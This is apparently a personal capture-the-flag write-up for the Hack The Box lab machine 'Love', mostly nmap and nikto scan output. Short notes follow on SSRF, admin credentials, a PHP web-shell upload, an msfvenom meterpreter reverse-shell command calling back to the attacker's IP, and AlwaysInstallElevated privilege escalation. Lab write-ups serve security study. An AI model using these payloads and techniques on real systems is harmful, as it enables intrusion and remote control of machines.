
# Enum

## Nmap Scan

```
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
443/tcp   open     https
445/tcp   open     microsoft-ds
3306/tcp  open     mysql
5000/tcp  open     upnp
5040/tcp  open     unknown
5985/tcp  open     wsman
5986/tcp  open     wsmans
7680/tcp  open     pando-pub
47001/tcp open     winrm
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49668/tcp open     unknown
49669/tcp open     unknown
49670/tcp open     unknown
55683/tcp filtered unknown
```


#### Scan with `-A`

```

80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings: 
|   NCP, NULL: 
|_    Host '10.10.14.86' is not allowed to connect to this MariaDB server
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=8/2%Time=6107E499%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.86'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NCP,4A,"F\0\0
SF:\x01\xffj\x04Host\x20'10\.10\.14\.86'\x20is\x20not\x20allowed\x20to\x20
SF:connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h54m45s, deviation: 4h02m31s, median: 34m43s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-02T06:02:06-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-02T13:02:03
|_  start_date: N/A

PORT      STATE SERVICE    VERSION
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http   Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-08-02T13:09:47+00:00; +34m44s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 34m43s


```

## Nikto Scan

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.239
+ Target Hostname:    10.10.10.239
+ Target Port:        80
+ Start Time:         2021-08-02 18:38:13 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+ Retrieved x-powered-by header: PHP/7.3.27
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3268: /includes/: Directory indexing found.
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /Admin/: This might be interesting...
+ 8675 requests: 2 error(s) and 15 item(s) reported on remote host
+ End Time:           2021-08-02 19:12:34 (GMT5.5) (2061 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

***

### Enumrating Sub-Domins

From the above Nmap Scap Found these Domains

- staging.love.htb

- www.love.htb

added staging.love.htb into /etc/hosts file 

Demo page have a file scan option

- LFI/RFI seems not to be working here

- Entered 127.0.0.1:5000 ; using server to read internal resources (SSRF)

And we the credentials ==> admin: @LoveIsInTheAir!!!!

***

# ==>FoothHolding

## getting a reverse shell

- The Profile page have option to upload a pic, but maybe a shell can also be uploaded

- https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php  <== Used this awesome webshell ; other Reverse shells seems not to be working

- uploaded the shell and that can be accessed `/images/` which was found during **`Dir Fuzzing`**

- Rev-Shell ==> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.86 LPORT=4242 -f exe -o rev.exe

- uploaded rev.exe and executed it using `WEB-Shell` 

***

# ==>Prev Esc

- Uploaded winPeas64.exe

- From The WinPease Scan , determined `exploit/windows/local/always_install_elevated` <== Metasploit module can be used

- https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated

